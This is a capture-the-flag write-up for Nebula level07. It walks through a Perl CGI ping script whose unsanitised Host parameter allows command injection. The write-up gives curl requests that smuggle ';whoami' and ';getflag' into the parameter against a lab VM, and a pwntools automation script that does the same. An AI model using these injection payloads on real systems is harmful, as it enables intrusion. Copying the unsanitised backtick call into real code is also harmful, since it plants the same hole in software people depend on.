# Level07

#### Description

The **flag07** user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

To do this level, log in as the **level07** account with the password **level07**. Files for this level can be found in /home/flag07.

#### Source Code

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

#### Solution

This perl script takes user input and then do a ping and returns the output. So, basically there is a command injection vulnerability in these line of script.

```perl
@output = `ping -c 3 $host 2>&1`;
```

Here, the value of host variable is provided by user and it's not sanitized, so we can add additional commands also using `;` .

There is one more file present on flag07 home directory - `thttpd.conf` , which shows there's a server running on port 7007 and from there we can access that file.

```bash
level07@nebula:/home/flag07$ ls -la
total 10
drwxr-x--- 2 flag07 level07  102 2011-11-20 20:39 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ netstat -antp
(No info could be read for "-p": geteuid()=1008 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:50001         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:10007           0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.117.140:22      192.168.117.128:33978   ESTABLISHED -               
tcp6       0      0 :::1616                 :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::7007                 :::*                    LISTEN      -   
```

We can simply trigger that command injection using curl (with url encoding) command from our attacker kali machine.

```bash
┌──(ghost㉿kali)-[~/nebula/level07]
└─$ curl 'http://192.168.117.140:7007/index.cgi?Host=127.0.0.1%3Bwhoami'
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.014 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.013 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.013/0.013/0.014/0.003 ms
flag07
</pre></body></html> 
```

Command injection was successful, now we can also execute `getflag` command.

```bash
──(ghost㉿kali)-[~/nebula/level07]
└─$ curl 'http://192.168.117.140:7007/index.cgi?Host=127.0.0.1%3Bgetflag'
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.020 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.018 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.018 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.018/0.018/0.020/0.005 ms
You have successfully executed getflag on a target account
</pre></body></html>       
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level07', password='level07')

session.run("wget http://192.168.117.140:7007/index.cgi?Host=127.0.0.1%3Bgetflag%3Bid -O /tmp/flag")

terminal = session.shell()
terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
